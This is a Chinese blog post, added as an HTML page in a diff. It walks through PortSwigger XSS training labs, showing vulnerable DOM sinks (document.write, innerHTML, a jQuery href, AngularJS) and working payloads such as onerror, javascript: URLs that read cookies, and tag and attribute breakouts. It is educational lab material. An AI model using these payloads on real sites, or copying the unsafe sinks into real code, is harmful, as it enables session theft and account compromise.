@@ -1,0 +1,680 @@
+<!DOCTYPE html><html lang="zh-CN" data-theme="light"><head><meta charset="UTF-8"><meta http-equiv="X-UA-Compatible" content="IE=edge"><meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no"><title>Cross-site scripting | wanan</title><meta name="keywords" content="burp,xss"><meta name="author" content="wanan"><meta name="copyright" content="wanan"><meta name="format-detection" content="telephone=no"><meta name="theme-color" content="#ffffff"><meta name="description" content="https:&#x2F;&#x2F;portswigger.net&#x2F;web-security&#x2F;cross-site-scripting&#x2F;cheat-sheet XSS反射(1) &lt;script&gt;alert(&#x2F;1&#x2F;)&lt;&#x2F;script&gt;    存储(2)这里需要先存储xss到数据库接着查看     dom(3)这里是使用的 dom   这里先进行  可以看到这里多了一段代码 &lt;script&amp;">
+<meta property="og:type" content="article">
+<meta property="og:title" content="Cross-site scripting">
+<meta property="og:url" content="https://www.wanan.red/da9cf488.html">
+<meta property="og:site_name" content="wanan">
+<meta property="og:description" content="https:&#x2F;&#x2F;portswigger.net&#x2F;web-security&#x2F;cross-site-scripting&#x2F;cheat-sheet XSS反射(1) &lt;script&gt;alert(&#x2F;1&#x2F;)&lt;&#x2F;script&gt;    存储(2)这里需要先存储xss到数据库接着查看     dom(3)这里是使用的 dom   这里先进行  可以看到这里多了一段代码 &lt;script&amp;">
+<meta property="og:locale" content="zh_CN">
+<meta property="og:image" content="https://cdn.pixabay.com/photo/2018/01/12/14/24/night-3078326_1280.jpg">
+<meta property="article:published_time" content="2023-01-08T11:45:34.523Z">
+<meta property="article:modified_time" content="2023-01-08T11:46:39.438Z">
+<meta property="article:author" content="wanan">
+<meta property="article:tag" content="burp">
+<meta property="article:tag" content="xss">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="https://cdn.pixabay.com/photo/2018/01/12/14/24/night-3078326_1280.jpg"><link rel="shortcut icon" href="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/img/202203092159138.jpeg"><link rel="canonical" href="https://www.wanan.red/da9cf488"><link rel="preconnect" href="//cdn.jsdelivr.net"/><link rel="preconnect" href="//www.google-analytics.com" crossorigin=""/><link rel="preconnect" href="//hm.baidu.com"/><link rel="preconnect" href="//busuanzi.ibruce.info"/><meta name="google-site-verification" content="Lkrie_55AalLqll4AtBs-NEomlv8QQYHGMx1V0cbq88"/><meta name="baidu-site-verification" content="code-h7qMMwh8fd"/><link rel="stylesheet" href="/css/index.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free/css/all.min.css" media="print" onload="this.media='all'"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fancyapps/ui/dist/fancybox.min.css" media="print" onload="this.media='all'"><script>var _hmt = _hmt || [];
+(function() {
+  var hm = document.createElement("script");
+  hm.src = "https://hm.baidu.com/hm.js?0a85e115f35e16b8da9503b0d77633ca";
+  var s = document.getElementsByTagName("script")[0]; 
+  s.parentNode.insertBefore(hm, s);
+})();
+</script><script async="async" src="https://www.googletagmanager.com/gtag/js?id=G-FYB0HL88QE"></script><script>window.dataLayer = window.dataLayer || [];
+function gtag(){dataLayer.push(arguments);}
+gtag('js', new Date());
+gtag('config', 'G-FYB0HL88QE');
+</script><script>const GLOBAL_CONFIG = { 
+  root: '/',
+  algolia: undefined,
+  localSearch: {"path":"/search.xml","preload":false,"languages":{"hits_empty":"找不到您查询的内容：${query}"}},
+  translate: undefined,
+  noticeOutdate: undefined,
+  highlight: {"plugin":"highlighjs","highlightCopy":true,"highlightLang":true,"highlightHeightLimit":false},
+  copy: {
+    success: '复制成功',
+    error: '复制错误',
+    noSupport: '浏览器不支持'
+  },
+  relativeDate: {
+    homepage: false,
+    post: false
+  },
+  runtime: '天',
+  date_suffix: {
+    just: '刚刚',
+    min: '分钟前',
+    hour: '小时前',
+    day: '天前',
+    month: '个月前'
+  },
+  copyright: undefined,
+  lightbox: 'fancybox',
+  Snackbar: undefined,
+  source: {
+    justifiedGallery: {
+      js: 'https://cdn.jsdelivr.net/npm/flickr-justified-gallery/dist/fjGallery.min.js',
+      css: 'https://cdn.jsdelivr.net/npm/flickr-justified-gallery/dist/fjGallery.min.css'
+    }
+  },
+  isPhotoFigcaption: false,
+  islazyload: false,
+  isAnchor: true
+}</script><script id="config-diff">var GLOBAL_CONFIG_SITE = {
+  title: 'Cross-site scripting',
+  isPost: true,
+  isHome: false,
+  isHighlightShrink: false,
+  isToc: true,
+  postUpdate: '2023-01-08 19:46:39'
+}</script><noscript><style type="text/css">
+  #nav {
+    opacity: 1
+  }
+  .justified-gallery img {
+    opacity: 1
+  }
+
+  #recent-posts time,
+  #post-meta time {
+    display: inline !important
+  }
+</style></noscript><script>(win=>{
+    win.saveToLocal = {
+      set: function setWithExpiry(key, value, ttl) {
+        if (ttl === 0) return
+        const now = new Date()
+        const expiryDay = ttl * 86400000
+        const item = {
+          value: value,
+          expiry: now.getTime() + expiryDay,
+        }
+        localStorage.setItem(key, JSON.stringify(item))
+      },
+
+      get: function getWithExpiry(key) {
+        const itemStr = localStorage.getItem(key)
+
+        if (!itemStr) {
+          return undefined
+        }
+        const item = JSON.parse(itemStr)
+        const now = new Date()
+
+        if (now.getTime() > item.expiry) {
+          localStorage.removeItem(key)
+          return undefined
+        }
+        return item.value
+      }
+    }
+  
+    win.getScript = url => new Promise((resolve, reject) => {
+      const script = document.createElement('script')
+      script.src = url
+      script.async = true
+      script.onerror = reject
+      script.onload = script.onreadystatechange = function() {
+        const loadState = this.readyState
+        if (loadState && loadState !== 'loaded' && loadState !== 'complete') return
+        script.onload = script.onreadystatechange = null
+        resolve()
+      }
+      document.head.appendChild(script)
+    })
+  
+      win.activateDarkMode = function () {
+        document.documentElement.setAttribute('data-theme', 'dark')
+        if (document.querySelector('meta[name="theme-color"]') !== null) {
+          document.querySelector('meta[name="theme-color"]').setAttribute('content', '#0d0d0d')
+        }
+      }
+      win.activateLightMode = function () {
+        document.documentElement.setAttribute('data-theme', 'light')
+        if (document.querySelector('meta[name="theme-color"]') !== null) {
+          document.querySelector('meta[name="theme-color"]').setAttribute('content', '#ffffff')
+        }
+      }
+      const t = saveToLocal.get('theme')
+    
+          if (t === 'dark') activateDarkMode()
+          else if (t === 'light') activateLightMode()
+        
+      const asideStatus = saveToLocal.get('aside-status')
+      if (asideStatus !== undefined) {
+        if (asideStatus === 'hide') {
+          document.documentElement.classList.add('hide-aside')
+        } else {
+          document.documentElement.classList.remove('hide-aside')
+        }
+      }
+    
+    const detectApple = () => {
+      if(/iPad|iPhone|iPod|Macintosh/.test(navigator.userAgent)){
+        document.documentElement.classList.add('apple')
+      }
+    }
+    detectApple()
+    })(window)</script><meta name="generator" content="Hexo 6.0.0"></head><body><div id="sidebar"><div id="menu-mask"></div><div id="sidebar-menus"><div class="avatar-img is-center"><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/img/202203092159138.jpeg" onerror="onerror=null;src='/img/friend_404.gif'" alt="avatar"/></div><div class="sidebar-site-data site-data is-center"><a href="/archives/"><div class="headline">文章</div><div class="length-num">99</div></a><a href="/tags/"><div class="headline">标签</div><div class="length-num">76</div></a><a href="/categories/"><div class="headline">分类</div><div class="length-num">83</div></a></div><hr/><div class="menus_items"><div class="menus_item"><a class="site-page" href="/"><i class="fa-fw fas fa-home"></i><span> 首页</span></a></div><div class="menus_item"><a class="site-page" href="/archives/"><i class="fa-fw fas fa-archive"></i><span> 时间轴</span></a></div><div class="menus_item"><a class="site-page" href="/tags/"><i class="fa-fw fas fa-tags"></i><span> 标签</span></a></div><div class="menus_item"><a class="site-page" href="/categories/"><i class="fa-fw fas fa-folder-open"></i><span> 分类</span></a></div><div class="menus_item"><a class="site-page" href="/link/"><i class="fa-fw fas fa-link"></i><span> 友链</span></a></div><div class="menus_item"><a class="site-page" href="/about/"><i class="fa-fw fas fa-heart"></i><span> 关于</span></a></div></div></div></div><div class="post" id="body-wrap"><header class="post-bg" id="page-header" style="background-image: url('https://cdn.pixabay.com/photo/2018/01/12/14/24/night-3078326_1280.jpg')"><nav id="nav"><span id="blog_name"><a id="site-name" href="/">wanan</a></span><div id="menus"><div id="search-button"><a class="site-page social-icon search"><i class="fas fa-search fa-fw"></i><span> 搜索</span></a></div><div class="menus_items"><div class="menus_item"><a class="site-page" href="/"><i class="fa-fw fas fa-home"></i><span> 首页</span></a></div><div class="menus_item"><a class="site-page" href="/archives/"><i class="fa-fw fas fa-archive"></i><span> 时间轴</span></a></div><div class="menus_item"><a class="site-page" href="/tags/"><i class="fa-fw fas fa-tags"></i><span> 标签</span></a></div><div class="menus_item"><a class="site-page" href="/categories/"><i class="fa-fw fas fa-folder-open"></i><span> 分类</span></a></div><div class="menus_item"><a class="site-page" href="/link/"><i class="fa-fw fas fa-link"></i><span> 友链</span></a></div><div class="menus_item"><a class="site-page" href="/about/"><i class="fa-fw fas fa-heart"></i><span> 关于</span></a></div></div><div id="toggle-menu"><a class="site-page"><i class="fas fa-bars fa-fw"></i></a></div></div></nav><div id="post-info"><h1 class="post-title">Cross-site scripting</h1><div id="post-meta"><div class="meta-firstline"><span class="post-meta-date"><i class="far fa-calendar-alt fa-fw post-meta-icon"></i><span class="post-meta-label">发表于</span><time class="post-meta-date-created" datetime="2023-01-08T11:45:34.523Z" title="发表于 2023-01-08 19:45:34">2023-01-08</time><span class="post-meta-separator">|</span><i class="fas fa-history fa-fw post-meta-icon"></i><span class="post-meta-label">更新于</span><time class="post-meta-date-updated" datetime="2023-01-08T11:46:39.438Z" title="更新于 2023-01-08 19:46:39">2023-01-08</time></span><span class="post-meta-categories"><span class="post-meta-separator">|</span><i class="fas fa-inbox fa-fw post-meta-icon"></i><a class="post-meta-categories" href="/categories/burp/">burp</a><i class="fas fa-angle-right post-meta-separator"></i><i class="fas fa-inbox fa-fw post-meta-icon"></i><a class="post-meta-categories" href="/categories/burp/Cross-site-scripting/">Cross-site scripting</a></span></div><div class="meta-secondline"><span class="post-meta-separator">|</span><span class="post-meta-wordcount"><i class="far fa-file-word fa-fw post-meta-icon"></i><span class="post-meta-label">字数总计:</span><span class="word-count">4.4k</span><span class="post-meta-separator">|</span><i class="far fa-clock fa-fw post-meta-icon"></i><span class="post-meta-label">阅读时长:</span><span>20分钟</span></span><span class="post-meta-separator">|</span><span class="post-meta-pv-cv" id="" data-flag-title="Cross-site scripting"><i class="far fa-eye fa-fw post-meta-icon"></i><span class="post-meta-label">阅读量:</span><span id="busuanzi_value_page_pv"><i class="fa-solid fa-spinner fa-spin"></i></span></span></div></div></div></header><main class="layout" id="content-inner"><div id="post"><article class="post-content" id="article-container"><p><a target="_blank" rel="noopener" href="https://portswigger.net/web-security/cross-site-scripting/cheat-sheet">https://portswigger.net/web-security/cross-site-scripting/cheat-sheet</a></p>
+<h1 id="XSS"><a href="#XSS" class="headerlink" title="XSS"></a>XSS</h1><h2 id="反射-1"><a href="#反射-1" class="headerlink" title="反射(1)"></a>反射(1)</h2><p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/img/image-20221110132745836.png" alt="image-20221110132745836"></p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;script&gt;alert(/1/)&lt;/script&gt;</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/img/image-20221110133037084.png" alt="image-20221110133037084"></p>
+<p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/img/image-20221110133054795.png" alt="image-20221110133054795"></p>
+<h2 id="存储-2"><a href="#存储-2" class="headerlink" title="存储(2)"></a>存储(2)</h2><p>这里需要先存储xss到数据库接着查看</p>
+<p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/img/image-20221110133345694.png" alt="image-20221110133345694"></p>
+<p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/img/image-20221110133338257.png" alt="image-20221110133338257"></p>
+<p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/img/image-20221110133534222.png" alt="image-20221110133534222"></p>
+<p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/img/image-20221110133545825.png" alt="image-20221110133545825"></p>
+<h2 id="dom-3"><a href="#dom-3" class="headerlink" title="dom(3)"></a>dom(3)</h2><p>这里是使用的 dom </p>
+<p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/img/image-20221110142426127.png" alt="image-20221110142426127"></p>
+<p>这里先进行</p>
+<p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/img/image-20221110142604085.png" alt="image-20221110142604085"></p>
+<p>可以看到这里多了一段代码</p>
+<figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="language-javascript"></span></span><br><span class="line"><span class="language-javascript">   <span class="keyword">function</span> <span class="title function_">trackSearch</span>(<span class="params">query</span>) &#123;</span></span><br><span class="line"><span class="language-javascript">           <span class="variable language_">document</span>.<span class="title function_">write</span>(<span class="string">&#x27;&lt;img src=&quot;/resources/images/tracker.gif?searchTerms=&#x27;</span>+query+<span class="string">&#x27;&quot;&gt;&#x27;</span>);</span></span><br><span class="line"><span class="language-javascript">    &#125;</span></span><br><span class="line"><span class="language-javascript">   <span class="keyword">var</span> query = (<span class="keyword">new</span> <span class="title class_">URLSearchParams</span>(<span class="variable language_">window</span>.<span class="property">location</span>.<span class="property">search</span>)).<span class="title function_">get</span>(<span class="string">&#x27;search&#x27;</span>);</span></span><br><span class="line"><span class="language-javascript">   <span class="keyword">if</span>(query) &#123;</span></span><br><span class="line"><span class="language-javascript">          <span class="title function_">trackSearch</span>(query);</span></span><br><span class="line"><span class="language-javascript">    &#125;</span></span><br><span class="line"><span class="language-javascript"> </span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br></pre></td></tr></table></figure>
+
+<p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/img/image-20221110143051451.png" alt="image-20221110143051451"></p>
+<p>这里尝试去构造一下</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">document.write(&#x27;&lt;img src=&quot;/resources/images/tracker.gif?searchTerms=&#x27;+&quot;&gt;&lt;script&gt;alert(/1/)&lt;/script&gt;&quot;+&#x27;&quot;&gt;&#x27;);</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/img/image-20221110144734298.png" alt="image-20221110144734298"></p>
+<p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/img/image-20221110144743275.png" alt="image-20221110144743275"></p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&quot;&gt;&lt;svg onload=alert(1)&gt;</span><br></pre></td></tr></table></figure>
+
+<p>SVG用来绘画矢量图  onload 在 SVG 文档被浏览器完全解析之后触发动作。 使用此事件调用一次性初始化功能。</p>
+<p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/img/image-20221110182810990.png" alt="image-20221110182810990"></p>
+<h2 id="innerHTML-4"><a href="#innerHTML-4" class="headerlink" title="innerHTML(4)"></a>innerHTML(4)</h2><p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/img/image-20221110184718071.png" alt="image-20221110184718071"></p>
+<figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">h1</span>&gt;</span><span class="tag">&lt;<span class="name">span</span>&gt;</span>2 search results for &#x27;<span class="tag">&lt;/<span class="name">span</span>&gt;</span><span class="tag">&lt;<span class="name">span</span> <span class="attr">id</span>=<span class="string">&quot;searchMessage&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">span</span>&gt;</span><span class="tag">&lt;<span class="name">span</span>&gt;</span>&#x27;<span class="tag">&lt;/<span class="name">span</span>&gt;</span><span class="tag">&lt;/<span class="name">h1</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="language-javascript"></span></span><br><span class="line"><span class="language-javascript">    <span class="keyword">function</span> <span class="title function_">doSearchQuery</span>(<span class="params">query</span>) &#123;</span></span><br><span class="line"><span class="language-javascript">        <span class="variable language_">document</span>.<span class="title function_">getElementById</span>(<span class="string">&#x27;searchMessage&#x27;</span>).<span class="property">innerHTML</span> = query;</span></span><br><span class="line"><span class="language-javascript">    &#125;</span></span><br><span class="line"><span class="language-javascript"></span></span><br><span class="line"><span class="language-javascript">    <span class="keyword">var</span> query = (<span class="keyword">new</span> <span class="title class_">URLSearchParams</span>(<span class="variable language_">window</span>.<span class="property">location</span>.<span class="property">search</span>)).<span class="title function_">get</span>(<span class="string">&#x27;search&#x27;</span>);</span></span><br><span class="line"><span class="language-javascript">    <span class="keyword">if</span> (query) &#123;</span></span><br><span class="line"><span class="language-javascript">        <span class="title function_">doSearchQuery</span>(query);</span></span><br><span class="line"><span class="language-javascript">    &#125;</span></span><br><span class="line"><span class="language-javascript"></span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br></pre></td></tr></table></figure>
+
+<p>这里使用的是  innerHTML 去给serarchMessage 赋值</p>
+<p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/img/image-20221110184826377.png" alt="image-20221110184826377"></p>
+<p>这里直接插入script 语句发现也没什么问题 但是却没有弹窗 说明innetHTML对我输入的请求又进行了一次 解码 </p>
+<p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/img/image-20221110193133036.png" alt="image-20221110193133036"></p>
+<p>这里尝试先去html编码试试 那么这里解析一次后应该是<code>&lt;script&gt;alert(1)&lt;/script&gt;</code> 如果innerHTML是解析后直接显示就应该弹窗,查看处理后的源代码输出是 <code>&lt;script&gt;alert(1)&lt;/script&gt;</code> 那么就清楚了innerHTML在javascript处理的时候做过一次HTML解析,然后到了浏览器加载页面时又做了一次HTML编码 </p>
+<p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/img/image-20221110193441828.png" alt="image-20221110193441828"></p>
+<p>这里便换了一种方式执行</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;img src=1 onerror=alert(1)&gt;</span><br></pre></td></tr></table></figure>
+
+<p>改src属性的值无效并引发错误 会触发 onerror 事件处理程序 然后调用alert函数</p>
+<p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/img/image-20221110190824596.png" alt="image-20221110190824596"></p>
+<h2 id="jQuery查找锚元素-5"><a href="#jQuery查找锚元素-5" class="headerlink" title="jQuery查找锚元素(5)"></a>jQuery查找锚元素(5)</h2><p>这里尝试</p>
+<p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/img/image-20221110200835856.png" alt="image-20221110200835856"></p>
+<p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/img/image-20221110200831309.png" alt="image-20221110200831309"></p>
+<p>没反应</p>
+<p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/img/image-20221110201844993.png" alt="image-20221110201844993"></p>
+<p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/img/image-20221110201906255.png" alt="image-20221110201906255"></p>
+<figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">&quot;is-linkback&quot;</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">a</span> <span class="attr">id</span>=<span class="string">&quot;backLink&quot;</span>&gt;</span>Back<span class="tag">&lt;/<span class="name">a</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="language-javascript"></span></span><br><span class="line"><span class="language-javascript">    $(<span class="keyword">function</span> (<span class="params"></span>) &#123;</span></span><br><span class="line"><span class="language-javascript">        $(<span class="string">&#x27;#backLink&#x27;</span>).<span class="title function_">attr</span>(<span class="string">&quot;href&quot;</span>, (<span class="keyword">new</span> <span class="title class_">URLSearchParams</span>(<span class="variable language_">window</span>.<span class="property">location</span>.<span class="property">search</span>)).<span class="title function_">get</span>(<span class="string">&#x27;returnPath&#x27;</span>));</span></span><br><span class="line"><span class="language-javascript">    &#125;);</span></span><br><span class="line"><span class="language-javascript"></span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br></pre></td></tr></table></figure>
+
+<p>#backLink 选择id 为 backLink 的元素 attr() 用于设置 href属性的值</p>
+<p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/img/image-20221113223248562.png" alt="image-20221113223248562"></p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">javascript:alert(document.cookie)</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/img/image-20221113223548882.png" alt="image-20221113223548882"></p>
+<h2 id="尖括号的-HTML-编码-6"><a href="#尖括号的-HTML-编码-6" class="headerlink" title="尖括号的 HTML 编码(6)"></a>尖括号的 HTML 编码(6)</h2><p>这里进行了 &lt; 的过滤</p>
+<p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/img/image-20221117192743538.png" alt="image-20221117192743538"></p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;script&gt;alert(/1/)&lt;/script&gt;</span><br></pre></td></tr></table></figure>
+
+<p>可以看到这里的pyload已经失效了</p>
+<p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/img/image-20221117194304458.png" alt="image-20221117194304458"></p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;input type=text placeholder=&#x27;Search the blog...&#x27; name=search value=&quot;&quot; onmouseover=&quot;alert(1)&quot;&gt;</span><br></pre></td></tr></table></figure>
+
+<p>尝试去闭合属性构造payload</p>
+<p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/img/image-20221117194614314.png" alt="image-20221117194614314"></p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&quot; onmouseover=&quot;alert(1)</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/img/image-20221117194755820.png" alt="image-20221117194755820"></p>
+<h2 id="href带有双引号-HTML-编码-7"><a href="#href带有双引号-HTML-编码-7" class="headerlink" title="href带有双引号 HTML 编码(7)"></a>href带有双引号 HTML 编码(7)</h2><p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/img/image-20221117194834458.png" alt="image-20221117194834458"></p>
+<p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/img/image-20221117194949684.png" alt="image-20221117194949684"></p>
+<p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/img/image-20221117195045237.png" alt="image-20221117195045237"></p>
+<p>尝试构造javascript: 伪协议</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">javascript:alert(1)</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/img/image-20221117195527873.png" alt="image-20221117195527873"></p>
+<p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/img/image-20221117195628045.png" alt="image-20221117195628045"></p>
+<h2 id="js代码注入-8"><a href="#js代码注入-8" class="headerlink" title="js代码注入(8)"></a>js代码注入(8)</h2><p>这里提示我们有js注入</p>
+<p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/img/image-20221117202642198.png" alt="image-20221117202642198"></p>
+<p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/img/image-20221117202836187.png" alt="image-20221117202836187"></p>
+<p>根据颜色来看成功注入了</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&#x27;-alert(1)-&#x27;</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/img/image-20221117203018176.png" alt="image-20221117203018176"></p>
+<p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/img/image-20221117203042489.png" alt="image-20221117203042489"></p>
+<h2 id="location-search-select-DOM-XSS-9"><a href="#location-search-select-DOM-XSS-9" class="headerlink" title="location.search  select DOM XSS(9)"></a>location.search  select DOM XSS(9)</h2><p>url dom xss</p>
+<p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/img/image-20221117203343240.png" alt="image-20221117203343240"></p>
+<p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/img/image-20221117203515066.png" alt="image-20221117203515066"></p>
+<p>这里可以看到其实也像是注入</p>
+<p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/img/image-20221117205042907.png" alt="image-20221117205042907"></p>
+<figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">form</span> <span class="attr">id</span>=<span class="string">&quot;stockCheckForm&quot;</span> <span class="attr">action</span>=<span class="string">&quot;/product/stock&quot;</span> <span class="attr">method</span>=<span class="string">&quot;POST&quot;</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">input</span> <span class="attr">required</span> <span class="attr">type</span>=<span class="string">&quot;hidden&quot;</span> <span class="attr">name</span>=<span class="string">&quot;productId&quot;</span> <span class="attr">value</span>=<span class="string">&quot;1&quot;</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="language-javascript"></span></span><br><span class="line"><span class="language-javascript">        <span class="keyword">var</span> stores = [<span class="string">&quot;London&quot;</span>, <span class="string">&quot;Paris&quot;</span>, <span class="string">&quot;Milan&quot;</span>];</span></span><br><span class="line"><span class="language-javascript">        <span class="keyword">var</span> store = (<span class="keyword">new</span> <span class="title class_">URLSearchParams</span>(<span class="variable language_">window</span>.<span class="property">location</span>.<span class="property">search</span>)).<span class="title function_">get</span>(<span class="string">&#x27;storeId&#x27;</span>);</span></span><br><span class="line"><span class="language-javascript">        <span class="comment">//这里是取url中的storeId的值</span></span></span><br><span class="line"><span class="language-javascript">        <span class="variable language_">document</span>.<span class="title function_">write</span>(<span class="string">&#x27;&lt;select name=&quot;storeId&quot;&gt;&#x27;</span>);</span></span><br><span class="line"><span class="language-javascript">        <span class="comment">//这里是写入html中</span></span></span><br><span class="line"><span class="language-javascript">        <span class="keyword">if</span> (store) &#123;</span></span><br><span class="line"><span class="language-javascript">            <span class="variable language_">document</span>.<span class="title function_">write</span>(<span class="string">&#x27;&lt;option selected&gt;&#x27;</span> + store + <span class="string">&#x27;&lt;/option&gt;&#x27;</span>);</span></span><br><span class="line"><span class="language-javascript">            <span class="comment">//拼接写入</span></span></span><br><span class="line"><span class="language-javascript">        &#125;</span></span><br><span class="line"><span class="language-javascript">        <span class="keyword">for</span> (<span class="keyword">var</span> i = <span class="number">0</span>; i &lt; stores.<span class="property">length</span>; i++) &#123;</span></span><br><span class="line"><span class="language-javascript">            <span class="keyword">if</span> (stores[i] === store) &#123;</span></span><br><span class="line"><span class="language-javascript">                <span class="keyword">continue</span>;</span></span><br><span class="line"><span class="language-javascript">            &#125;</span></span><br><span class="line"><span class="language-javascript">            <span class="variable language_">document</span>.<span class="title function_">write</span>(<span class="string">&#x27;&lt;option&gt;&#x27;</span> + stores[i] + <span class="string">&#x27;&lt;/option&gt;&#x27;</span>);</span></span><br><span class="line"><span class="language-javascript">        &#125;</span></span><br><span class="line"><span class="language-javascript">        <span class="variable language_">document</span>.<span class="title function_">write</span>(<span class="string">&#x27;&lt;/select&gt;&#x27;</span>);</span></span><br><span class="line"><span class="language-javascript">    </span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">button</span> <span class="attr">type</span>=<span class="string">&quot;submit&quot;</span> <span class="attr">class</span>=<span class="string">&quot;button&quot;</span>&gt;</span>Check stock<span class="tag">&lt;/<span class="name">button</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">form</span>&gt;</span></span><br></pre></td></tr></table></figure>
+
+<p>看到注入后的结果</p>
+<p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/img/image-20221117205145644.png" alt="image-20221117205145644"></p>
+<p>那么这里尝试把标签闭合 接着注入我们的html代码</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">1&lt;/option&gt;&lt;/select&gt;&lt;script&gt;alert(1)&lt;/script&gt;</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/img/image-20221117205509520.png" alt="image-20221117205509520"></p>
+<h2 id="AngularJS-表达式中的-DOM-XSS-10"><a href="#AngularJS-表达式中的-DOM-XSS-10" class="headerlink" title="AngularJS 表达式中的 DOM XSS(10)"></a>AngularJS 表达式中的 DOM XSS(10)</h2><p>这里告诉我们是 AngularJS  的xss漏洞</p>
+<p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/img/image-20221117212425834.png" alt="image-20221117212425834"></p>
+<p>简单看一下 写的是当 标签包含 ng-app属性的时候就可执行 AngularJS  的表达式 而这个表达式与一般的模板语言大致类似</p>
+<p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/img/image-20221117212540970.png" alt="image-20221117212540970"></p>
+<p>这里进来之后发现整个body 都可以执行 angular代码 那么我们这里进行尝试</p>
+<p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/img/image-20221117212726966.png" alt="image-20221117212726966"></p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&#123;&#123; 1+1 &#125;&#125;</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/img/image-20221117212817541.png" alt="image-20221117212817541"></p>
+<p>通过翻看 burp的文章可以发现 这里存在绕过的payload</p>
